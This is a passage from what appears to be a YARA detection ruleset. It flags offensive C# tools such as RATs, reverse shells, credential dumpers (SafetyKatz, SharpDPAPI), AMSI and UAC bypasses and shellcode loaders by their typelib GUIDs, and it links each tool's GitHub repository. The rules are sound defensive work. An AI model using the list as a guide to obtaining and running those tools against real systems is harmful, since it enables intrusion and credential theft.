        $typelibguid0 = "555ad0ac-1fdb-4016-8257-170a74cb2f55" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_LimeLogger {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/NYAN-x-CAT/LimeLogger"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "068d14ef-f0a1-4f9d-8e27-58b4317830c6" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_AggressorScripts {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/harleyQu1nn/AggressorScripts"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "afd1ff09-2632-4087-a30c-43591f32e4e8" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Gopher {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/EncodeGroup/Gopher"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "b5152683-2514-49ce-9aca-1bc43df1e234" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_AVIator {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/Ch0pin/AVIator"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "4885a4a3-4dfa-486c-b378-ae94a221661a" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_njCrypter {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/0xPh0enix/njCrypter"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "8a87b003-4b43-467b-a509-0c8be05bf5a5" ascii nocase wide
        $typelibguid1 = "80b13bff-24a5-4193-8e51-c62a414060ec" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpMiniDump {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/b4rtik/SharpMiniDump"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "6ffccf81-6c3c-4d3f-b15f-35a86d0b497f" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_CinaRAT {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/wearelegal/CinaRAT"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "8586f5b1-2ef4-4f35-bd45-c6206fdc0ebc" ascii nocase wide
        $typelibguid1 = "fe184ab5-f153-4179-9bf5-50523987cf1f" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_ToxicEye {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/LimerBoy/ToxicEye"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "1bcfe538-14f4-4beb-9a3f-3f9472794902" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Disable_Windows_Defender {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/NYAN-x-CAT/Disable-Windows-Defender"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "501e3fdc-575d-492e-90bc-703fb6280ee2" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_DInvoke_PoC {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/dtrizna/DInvoke_PoC"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "5a869ab2-291a-49e6-a1b7-0d0f051bef0e" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_ReverseShell {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/chango77747/ReverseShell"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "980109e4-c988-47f9-b2b3-88d63fababdc" ascii nocase wide
        $typelibguid1 = "8abe8da1-457e-4933-a40d-0958c8925985" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpC2 {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/SharpC2/SharpC2"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "62b9ee4f-1436-4098-9bc1-dd61b42d8b81" ascii nocase wide
        $typelibguid1 = "d2f17a91-eb2d-4373-90bf-a26e46c68f76" ascii nocase wide
        $typelibguid2 = "a9db9fcc-7502-42cd-81ec-3cd66f511346" ascii nocase wide
        $typelibguid3 = "ca6cc2ee-75fd-4f00-b687-917fa55a4fae" ascii nocase wide
        $typelibguid4 = "a1167b68-446b-4c0c-a8b8-2a7278b67511" ascii nocase wide
        $typelibguid5 = "4d8c2a88-1da5-4abe-8995-6606473d7cf1" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SneakyExec {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/HackingThings/SneakyExec"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "612590aa-af68-41e6-8ce2-e831f7fe4ccc" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_UrbanBishopLocal {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/slyd0g/UrbanBishopLocal"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "88b8515e-a0e8-4208-a9a0-34b01d7ba533" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpShell {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/cobbr/SharpShell"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "bdba47c5-e823-4404-91d0-7f6561279525" ascii nocase wide
        $typelibguid1 = "b84548dc-d926-4b39-8293-fa0bdef34d49" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_EvilWMIProvider {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/sunnyc7/EvilWMIProvider"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "a4020626-f1ec-4012-8b17-a2c8a0204a4b" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_GadgetToJScript {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/med0x2e/GadgetToJScript"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "af9c62a1-f8d2-4be0-b019-0a7873e81ea9" ascii nocase wide
        $typelibguid1 = "b2b3adb0-1669-4b94-86cb-6dd682ddbea3" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_AzureCLI_Extractor {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/0x09AL/AzureCLI-Extractor"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "a73cad74-f8d6-43e6-9a4c-b87832cdeace" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_UAC_Escaper {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/NYAN-x-CAT/UAC-Escaper"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "95359279-5cfa-46f6-b400-e80542a7336a" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_HTTPSBeaconShell {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/limbenjamin/HTTPSBeaconShell"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "aca853dc-9e74-4175-8170-e85372d5f2a9" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_AmsiScanBufferBypass {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/rasta-mouse/AmsiScanBufferBypass"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "431ef2d9-5cca-41d3-87ba-c7f5e4582dd2" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_ShellcodeLoader {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/Hzllaga/ShellcodeLoader"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "a48fe0e1-30de-46a6-985a-3f2de3c8ac96" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_KeystrokeAPI {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/fabriciorissetto/KeystrokeAPI"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "f6fec17e-e22d-4149-a8a8-9f64c3c905d3" ascii nocase wide
        $typelibguid1 = "b7aa4e23-39a4-49d5-859a-083c789bfea2" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_ShellCodeRunner {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/antman1p/ShellCodeRunner"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "634874b7-bf85-400c-82f0-7f3b4659549a" ascii nocase wide
        $typelibguid1 = "2f9c3053-077f-45f2-b207-87c3c7b8f054" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_OffensiveCSharp {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/diljith369/OffensiveCSharp"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "6c3fbc65-b673-40f0-b1ac-20636df01a85" ascii nocase wide
        $typelibguid1 = "2bad9d69-ada9-4f1e-b838-9567e1503e93" ascii nocase wide
        $typelibguid2 = "512015de-a70f-4887-8eae-e500fd2898ab" ascii nocase wide
        $typelibguid3 = "1ee4188c-24ac-4478-b892-36b1029a13b3" ascii nocase wide
        $typelibguid4 = "5c6b7361-f9ab-41dc-bfa0-ed5d4b0032a8" ascii nocase wide
        $typelibguid5 = "048a6559-d4d3-4ad8-af0f-b7f72b212e90" ascii nocase wide
        $typelibguid6 = "3412fbe9-19d3-41d8-9ad2-6461fcb394dc" ascii nocase wide
        $typelibguid7 = "9ea4e0dc-9723-4d93-85bb-a4fcab0ad210" ascii nocase wide
        $typelibguid8 = "6d2b239c-ba1e-43ec-8334-d67d52b77181" ascii nocase wide
        $typelibguid9 = "42e8b9e1-0cf4-46ae-b573-9d0563e41238" ascii nocase wide
        $typelibguid10 = "0d15e0e3-bcfd-4a85-adcd-0e751dab4dd6" ascii nocase wide
        $typelibguid11 = "644dfd1a-fda5-4948-83c2-8d3b5eda143a" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SHAPESHIFTER {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/matterpreter/SHAPESHIFTER"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "a3ddfcaa-66e7-44fd-ad48-9d80d1651228" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Evasor {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/cyberark/Evasor"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "1c8849ef-ad09-4727-bf81-1f777bd1aef8" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Stracciatella {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/mgeeky/Stracciatella"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "eaafa0ac-e464-4fc4-9713-48aa9a6716fb" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_logger {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/xxczaki/logger"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "9e92a883-3c8b-4572-a73e-bb3e61cfdc16" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Internal_Monologue {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/eladshamir/Internal-Monologue"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "0c0333db-8f00-4b68-b1db-18a9cacc1486" ascii nocase wide
        $typelibguid1 = "84701ace-c584-4886-a3cf-76c57f6e801a" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_GRAT2 {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/r3nhat/GRAT2"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "5e7fce78-1977-444f-a18e-987d708a2cff" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_PowerShdll {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/p3nt4/PowerShdll"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "36ebf9aa-2f37-4f1d-a2f1-f2a45deeaf21" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_CsharpAmsiBypass {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/WayneJLee/CsharpAmsiBypass"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "4ab3b95d-373c-4197-8ee3-fe0fa66ca122" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_HastySeries {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/obscuritylabs/HastySeries"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "8435531d-675c-4270-85bf-60db7653bcf6" ascii nocase wide
        $typelibguid1 = "47db989f-7e33-4e6b-a4a5-c392b429264b" ascii nocase wide
        $typelibguid2 = "300c7489-a05f-4035-8826-261fa449dd96" ascii nocase wide
        $typelibguid3 = "41bf8781-ae04-4d80-b38d-707584bf796b" ascii nocase wide
        $typelibguid4 = "620ed459-18de-4359-bfb0-6d0c4841b6f6" ascii nocase wide
        $typelibguid5 = "91e7cdfe-0945-45a7-9eaa-0933afe381f2" ascii nocase wide
        $typelibguid6 = "c28e121a-60ca-4c21-af4b-93eb237b882f" ascii nocase wide
        $typelibguid7 = "698fac7a-bff1-4c24-b2c3-173a6aae15bf" ascii nocase wide
        $typelibguid8 = "63a40d94-5318-42ad-a573-e3a1c1284c57" ascii nocase wide
        $typelibguid9 = "56b8311b-04b8-4e57-bb58-d62adc0d2e68" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_DreamProtectorFree {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/Paskowsky/DreamProtectorFree"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "f7e8a902-2378-426a-bfa5-6b14c4b40aa3" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_RedSharp {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/padovah4ck/RedSharp"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "30b2e0cf-34dd-4614-a5ca-6578fb684aea" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_ESC {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/NetSPI/ESC"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "06260ce5-61f4-4b81-ad83-7d01c3b37921" ascii nocase wide
        $typelibguid1 = "87fc7ede-4dae-4f00-ac77-9c40803e8248" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Csharp_Loader {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/NYAN-x-CAT/Csharp-Loader"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "5fd7f9fc-0618-4dde-a6a0-9faefe96c8a1" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_bantam {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/gellin/bantam"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "14c79bda-2ce6-424d-bd49-4f8d68630b7b" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpTask {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/jnqpblc/SharpTask"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "13e90a4d-bf7a-4d5a-9979-8b113e3166be" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_WindowsPlague {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/RITRedteam/WindowsPlague"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "cdf8b024-70c9-413a-ade3-846a43845e99" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Misc_CSharp {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/jnqpblc/Misc-CSharp"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "d1421ba3-c60b-42a0-98f9-92ba4e653f3d" ascii nocase wide
        $typelibguid1 = "2afac0dd-f46f-4f95-8a93-dc17b4f9a3a1" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpSpray {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/jnqpblc/SharpSpray"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "51c6e016-1428-441d-82e9-bb0eb599bbc8" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Obfuscator {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/3xpl01tc0d3r/Obfuscator"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "8fe5b811-a2cb-417f-af93-6a3cf6650af1" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SafetyKatz {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/GhostPack/SafetyKatz"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "8347e81b-89fc-42a9-b22c-f59a6a572dec" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Dropless_Malware {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/NYAN-x-CAT/Dropless-Malware"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "23b739f7-2355-491e-a7cd-a8485d39d6d6" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_UAC_SilentClean {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/EncodeGroup/UAC-SilentClean"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "948152a4-a4a1-4260-a224-204255bfee72" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_DesktopGrabber {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/NYAN-x-CAT/DesktopGrabber"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "e6aa0cd5-9537-47a0-8c85-1fbe284a4380" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_wsManager {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/guillaC/wsManager"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "9480809e-5472-44f3-b076-dcdf7379e766" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_UglyEXe {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/fashionproof/UglyEXe"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "233de44b-4ec1-475d-a7d6-16da48d6fc8d" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpDump {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/GhostPack/SharpDump"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "79c9bba3-a0ea-431c-866c-77004802d8a0" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_EducationalRAT {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/securesean/EducationalRAT"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "8a18fbcf-8cac-482d-8ab7-08a44f0e278e" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Stealth_Kid_RAT {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/ctsecurity/Stealth-Kid-RAT"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "bf43cd33-c259-4711-8a0e-1a5c6c13811d" ascii nocase wide
        $typelibguid1 = "e5b9df9b-a9e4-4754-8731-efc4e2667d88" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpCradle {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/anthemtotheego/SharpCradle"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "f70d2b71-4aae-4b24-9dae-55bc819c78bb" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_BypassUAC {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/cnsimo/BypassUAC"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "4e7c140d-bcc4-4b15-8c11-adb4e54cc39a" ascii nocase wide
        $typelibguid1 = "cec553a7-1370-4bbc-9aae-b2f5dbde32b0" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_hanzoInjection {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/P0cL4bs/hanzoInjection"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "32e22e25-b033-4d98-a0b3-3d2c3850f06c" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_clr_meterpreter {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/OJ/clr-meterpreter"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "6840b249-1a0e-433b-be79-a927696ea4b3" ascii nocase wide
        $typelibguid1 = "67c09d37-ac18-4f15-8dd6-b5da721c0df6" ascii nocase wide
        $typelibguid2 = "e05d0deb-d724-4448-8c4c-53d6a8e670f3" ascii nocase wide
        $typelibguid3 = "c3cc72bf-62a2-4034-af66-e66da73e425d" ascii nocase wide
        $typelibguid4 = "7ace3762-d8e1-4969-a5a0-dcaf7b18164e" ascii nocase wide
        $typelibguid5 = "3296e4a3-94b5-4232-b423-44f4c7421cb3" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_BYTAGE {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/KNIF/BYTAGE"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "8e46ba56-e877-4dec-be1e-394cb1b5b9de" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_MultiOS_ReverseShell {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/belane/MultiOS_ReverseShell"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "df0dd7a1-9f6b-4b0f-801e-e17e73b0801d" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_HideFromAMSI {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/0r13lc0ch4v1/HideFromAMSI"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "b91d2d44-794c-49b8-8a75-2fbec3fe3fe3" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_DotNetAVBypass_Master {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/lockfale/DotNetAVBypass-Master"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "4854c8dc-82b0-4162-86e0-a5bbcbc10240" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpDPAPI {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/GhostPack/SharpDPAPI"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "5f026c27-f8e6-4052-b231-8451c6a73838" ascii nocase wide
